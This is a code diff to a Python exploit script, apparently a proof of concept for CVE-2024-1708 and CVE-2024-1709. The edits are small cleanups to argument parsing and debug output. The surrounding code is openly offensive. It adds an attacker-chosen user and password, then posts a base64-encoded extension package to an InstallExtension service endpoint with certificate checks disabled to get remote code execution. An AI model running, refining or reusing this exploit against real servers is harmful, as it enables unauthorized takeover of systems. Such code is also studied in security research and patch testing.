@@ -106,7 +106,6 @@ def UploadExtension(url, anti_forgery_token):
     }
     url = url + "/Services/ExtensionService.ashx/InstallExtension"
     session.cookies.update({"settings": "%7B%22collapsedPanelMap%22%3A%7B%22Inactive%22%3Atrue%7D%7D"})
-    print(session.cookies.get_dict())
     try:
         response = session.post(url=url, data=f"[\"{zip_data_base64}\"]", headers=headers, verify=False, proxies=proxy)
         if response.status_code == 200:
@@ -217,16 +216,16 @@ def ParseArguments():
     parser = argparse.ArgumentParser(description="CVE-2024-1708 && CVE-2024-1709 --> RCE!!!")
     parser.add_argument("-u", "--username", type=str, default="cvetest", help="username you want to add", required=False)
     parser.add_argument("-p", "--password", type=str, default="cvetest@2023", help="password you want to add", required=False)
-    parser.add_argument("-t", "--target", type=str, default="http://1.2.3.4", help="target url", required=True)
+    parser.add_argument("-t", "--target", type=str, help="target url", required=True)
     parser.add_argument("-d", "--domain", type=str, default="poc.com", help="Description of domain", required=False)
-    parser.add_argument("-p", "--proxy", type=str, help="eg: http://127.0.0.1:8080", required=False)
+    parser.add_argument("--proxy", type=str, help="eg: http://127.0.0.1:8080", required=False)
     return parser.parse_args()
 
 if __name__ == "__main__":
     args = ParseArguments()
     username = args.username
     password = args.password
-    target = args.target
+    target = args.target.rstrip("/")
     domain = args.domain
     if args.proxy:
         proxy = {"http": args.proxy, "https": args.proxy}
